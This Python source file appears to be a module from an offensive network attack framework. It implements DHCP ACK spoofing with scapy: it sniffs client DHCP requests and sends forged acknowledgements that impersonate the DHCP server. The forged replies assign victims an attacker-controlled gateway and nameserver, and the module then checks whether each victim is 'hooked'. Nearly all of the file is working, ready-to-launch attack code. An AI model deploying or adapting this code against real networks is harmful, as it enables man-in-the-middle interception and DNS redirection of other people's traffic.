#!/usr/bin/python1
from gi.overrides import override

__author__ = 'root'

import modules.base.abstract_attack as abstract_attack
import modules.base.attack_parameters as attack_parameters

import dhcp_ack_spoofing_driver

import scapy.all
import scapy.utils as utils
import scapy.layers as layers
import scapy.arch as arch
from scapy.sendrecv import *
import random


class DHCPAckSpoofing(abstract_attack.AbstractAttack):

    def __init__(self):

        self._domain_param = attack_parameters.AttackParameters('domain')
        self._domain_param.set_required('gateway', 'The router IP address')
        self._domain_param.set_required('netmask', 'The netmask of the newtork')
        self._domain_param.set_required('broadcast', 'The broadcast IP address')
        self._domain_param.set_required('domain_name', 'The domain name for giving fqnd to machines')
        self._domain_param.set_required('nameserver', 'The ip of a single DNS to pass in parameter to the victim')

        self._misc_param = attack_parameters.AttackParameters('misc')
        self._misc_param.set_required('dhcp_MAC', 'The MAC address to spoof when sending false ACK')
        self._misc_param.set_required('lease_time', 'The lease time of a DHCP lease')
        self._misc_param.set_required('interface', 'The interface to listen to')

        super(DHCPAckSpoofing, self).__init__([self._domain_param, self._misc_param], 'dhcp_ack_spoofing')

    def get_driver(self):
        return dhcp_ack_spoofing_driver.DHCPAckSpoofDriver(self)

    def send_spoofed_ack(self, dhcp_request_udp_packet):

        #Get the IP of the DHCP server requested by client
        dhcp_request_options = dhcp_request_udp_packet[layers.dhcp.DHCP].options

        requested_dhcp_server_ip = next((x[1] for x in dhcp_request_options if x[0] == 'server_id'), '0.0.0.0')

        #ETHERNET LAYER
        hw = self.get_value('dhcp_MAC')

        victim_mac = dhcp_request_udp_packet[layers.l2.Ether].src
        #TODO try to replace src with one of the router
        spoofed_ack = layers.l2.Ether(dst=victim_mac, src=hw)

        #IP LAYER
        spoofed_ack = spoofed_ack/layers.inet.IP()
        spoofed_ack[layers.inet.IP].src = requested_dhcp_server_ip
        print('ip src : ' + requested_dhcp_server_ip)

        #Get the IP requested by client
        requested_ip = ''
        try:
            requested_ip = next(x for x in dhcp_request_options if x[0] == 'requested_addr')[1]

            #If the client is requesting an IP that dosent belong to our spoofed acces point, do nothing
            gateway_fields = self.get_value('gateway').split('.')
            netmask_fields = self.get_value('netmask').split('.')
            requested_fields = requested_ip.split('.')
            for gw, rq, nm in zip(gateway_fields, requested_fields, netmask_fields):
                if int(gw)&int(nm) != int(rq)&int(nm):
                    print('Client didn\'t requested a valid IP')
                    print('Requested IP :' + requested_ip)
                    print('Gateway :' + self.get_value('gateway'))
                    print('Netmask :' + self.get_value('netmask'))
                    return False

        except StopIteration:
            requested_ip = self.get_value('gateway')
            ip_fields = requested_ip.split('.')
            ip_fields[-1] = str(random.randrange(1, 0xFE))
            requested_ip = '.'.join(ip_fields)

            print('Client didn\'t requested an ip, trying with ' + requested_ip)

        print('Trying to hook client :' + requested_ip)

        spoofed_ack[layers.inet.IP].dst = requested_ip
        spoofed_ack[layers.inet.IP].id = random.randrange(200, 0xFFFF)

        #UDP LAYER
        spoofed_ack = spoofed_ack/layers.inet.UDP()

        #BOOTP LAYER
        spoofed_ack = spoofed_ack/layers.dhcp.BOOTP()
        spoofed_ack[layers.dhcp.BOOTP].op = 'BOOTREPLY'
        xid = dhcp_request_udp_packet[layers.dhcp.BOOTP].xid
        spoofed_ack[layers.dhcp.BOOTP].xid = xid

        spoofed_ack[layers.dhcp.BOOTP].yiaddr = requested_ip


        #spoofed_ack[layers.dhcp.BOOTP].siaddr = requested_dhcp_server_ip
        chaddr = dhcp_request_udp_packet[layers.dhcp.BOOTP].chaddr
        spoofed_ack[layers.dhcp.BOOTP].chaddr = chaddr

        #DHCP LAYER

        #Craft the spoofed DHCP packet
        message_type = ('message-type', 5)
        server_id = ('server_id', requested_dhcp_server_ip)
        lease_time = ('lease_time', int(self.get_value('lease_time')))
        renewal_time = ('renewal_time', 1800)
        rebinding_time = ('rebinding_time', 3150)
        netmask = ('subnet_mask', self.get_value('netmask'))
        broadcast_address = ('broadcast_address', self.get_value('broadcast'))
        domain = ('domain', self.get_value('domain_name'))
        router = ('router', self.get_value('gateway'))

        requested_dhcp_hostname = next((x for x in dhcp_request_options if x[0] == 'hostname'),
                                       (None, 'localhost'))[1]
        hostname = ('hostname', requested_dhcp_hostname)

        if self.get_value('nameserver'):
            name_server = ('name_server', self.get_value('nameserver'))
        else:
            name_server = ('name_server', self.get_value('gateway'))

        spoofed_ack = spoofed_ack/layers.dhcp.DHCP(options=[
            message_type,
            server_id,
            lease_time,
            renewal_time,
            rebinding_time,
            netmask,
            broadcast_address,
            domain,
            hostname,
            name_server,
            router,
            'end'
        ])

        sendp(spoofed_ack, iface=self.get_value('interface'), verbose=0)

        return True

    def hook_dhcp_request(self, udp_packet):
        if layers.dhcp.DHCP in udp_packet:
            dhcp_packet = udp_packet[layers.dhcp.DHCP]
            dhcp_type_index = dhcp_packet.options[0][1]

            if dhcp_type_index == 3:
                self.send_spoofed_ack(udp_packet)
                # Disabled this check. This should be on another thread as
                # when the victim is requesting an IP that is NOT available in the area,
                # multiple dhcp_request are sent. This would block/timeout...failing to send spoofed ACK
                #self.is_hooked(target_ip)
                return

    def is_hooked(self, target_ip):
        # If we received a packet shortly after, there's good chance we are
        # forwarding the victim.

        sniffed = scapy.sendrecv.sniff(self.get_value('interface'), timeout=15)
        victim_packets = [x for x in sniffed if layers.inet.IP in x and x[layers.inet.IP].src == target_ip]

        #Check if we sniffed an ICMP_UNREACHABLE, that means we didnt bind the victim...
        icmp_unreachable_pkts = [x for x in victim_packets if layers.inet.ICMP in x and x[layers.inet.ICMP].type == 3]
        if len(icmp_unreachable_pkts) > 0:
            print('SPOOF FAILED: Got ICMP UNREACHABLE, that basically means victim rejected forged ACK...')
            return

        if len(victim_packets) > 0:
            print('SUCCESS: There\'s good chances that ' + target_ip + ' is hooked!')
            return

        print('WARNING: No packets received from victim after 15 seconds, maybe the victim rejected forged ACK...')
        return

    def launch(self):
        scapy.sendrecv.sniff(iface=self.get_value('interface'), filter='udp', prn=self.hook_dhcp_request)
